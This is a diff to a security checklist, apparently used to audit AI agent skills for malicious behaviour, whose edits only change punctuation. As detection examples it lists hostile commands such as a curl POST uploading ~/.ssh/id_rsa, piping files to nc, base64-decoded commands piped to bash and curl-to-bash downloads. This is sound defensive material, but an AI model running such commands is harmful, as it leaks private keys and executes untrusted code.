@@ -9,7 +9,7 @@ Use this file as a checklist during Step 4 (Analyze Alignment). For each categor
 Sending local data to external endpoints without disclosure.
 
 **Examples in skills**:
-- `curl -X POST <url> -d @~/.ssh/id_rsa` — uploading sensitive files
+- `curl -X POST <url> -d @~/.ssh/id_rsa`: uploading sensitive files
 - Piping file contents to network commands (`cat file | nc host port`)
 - Reading local files and including contents in HTTP request bodies
 
@@ -31,13 +31,13 @@ Reading API keys, tokens, passwords, private keys, or credential stores.
 Hiding what code actually does through encoding, indirection, or dynamic construction.
 
 **Examples in skills**:
-- `echo "base64string" | base64 -d | bash` — encoded command execution
-- `eval $(cat hidden_script.sh)` — dynamic execution from files
+- `echo "base64string" | base64 -d | bash`: encoded command execution
+- `eval $(cat hidden_script.sh)`: dynamic execution from files
 - Variable indirection to construct commands at runtime
 - Hex-encoded strings decoded and executed
 - Comments or variable names that mislead about actual behavior
 - Unicode tricks: homoglyph substitution, invisible characters, RTL override to disguise commands
-- Password-protected archives (`unzip -P`) — specifically designed to evade automated scanning
+- Password-protected archives (`unzip -P`), specifically designed to evade automated scanning
 
 **When legitimate**: Almost never. Base64 encoding of binary data for transport is fine. Base64 encoding of commands for execution is a strong red flag regardless of stated intent. Password-protected archives in a skill have no legitimate use case.
 
@@ -52,7 +52,7 @@ Deleting, overwriting, or corrupting files, directories, or system state.
 - `chmod 000` or permission destruction
 - Truncating logs or databases
 
-**When legitimate**: Cleanup tools (node_modules deleters, temp file cleaners, cache purgers) — but MUST be disclosed in description and scoped to specific targets.
+**When legitimate**: Cleanup tools (node_modules deleters, temp file cleaners, cache purgers), but they MUST be disclosed in description and scoped to specific targets.
 
 ## 5. Privilege Escalation
 
@@ -100,7 +100,7 @@ Constructing and executing code at runtime rather than using static, inspectable
 **Examples in skills**:
 - `eval` with constructed strings
 - `source` of downloaded scripts
-- `curl <url> | bash` — download and execute
+- `curl <url> | bash`: download and execute
 - Python `exec()` or `compile()` with dynamic input
 - Node.js `eval()` or `Function()` constructors
 
@@ -130,7 +130,7 @@ Classic vulnerability patterns (OWASP) present in skill scripts or code.
 - Insecure deserialization: `pickle.loads()`, `yaml.load()` without safe loader
 - Hardcoded secrets: API keys, passwords, tokens in source code
 
-**When legitimate**: These are bugs, not intentional threats — but they indicate low code quality and create exploitable attack surface. Note them as risks even in otherwise aligned skills.
+**When legitimate**: These are bugs, not intentional threats, but they indicate low code quality and create exploitable attack surface. Note them as risks even in otherwise aligned skills.
 
 *Pattern knowledge informed by droid-tings/security-auditor (ovachiever).*
 
